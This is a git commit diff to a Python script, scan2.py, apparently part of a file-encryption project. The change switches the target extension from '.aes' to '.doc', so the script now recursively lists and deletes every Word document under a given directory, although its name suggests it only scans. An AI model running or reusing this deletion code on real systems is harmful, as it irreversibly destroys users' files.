7dde6a325c171a641c92e67d0b08524571f1dab6
Marco Romero <marcoromero_1@hotmail.com>
2020-07-31 20:24:46 -0300

    devs

--- scan2.py
+++ scan2.py
@@ -8,11 +8,10 @@ def main():
     uno_por_uno(lista)
 
 
-
 def select_files(elemento):
     # https://github.com/Darkfoe703/Cypher/blob/master/cyphermain.py
 
-    ext = [".aes"]
+    ext = [".doc"]
     files_to_enc = []
 
     direccion = elemento
@@ -20,13 +19,15 @@ def select_files(elemento):
         for filename in files:
             if filename.endswith(tuple(ext)):
                 files_to_enc.append(os.path.join(dirpath, filename))
-    print(*files_to_enc, sep = "\n")
-    return(files_to_enc)
+    print(*files_to_enc, sep="\n")
+    return files_to_enc
+
 
 def uno_por_uno(lista):
     for x in range(len(lista)):
         print(lista[x])
         os.remove(lista[x])
 
-if __name__ == '__main__':
+
+if __name__ == "__main__":
     main()
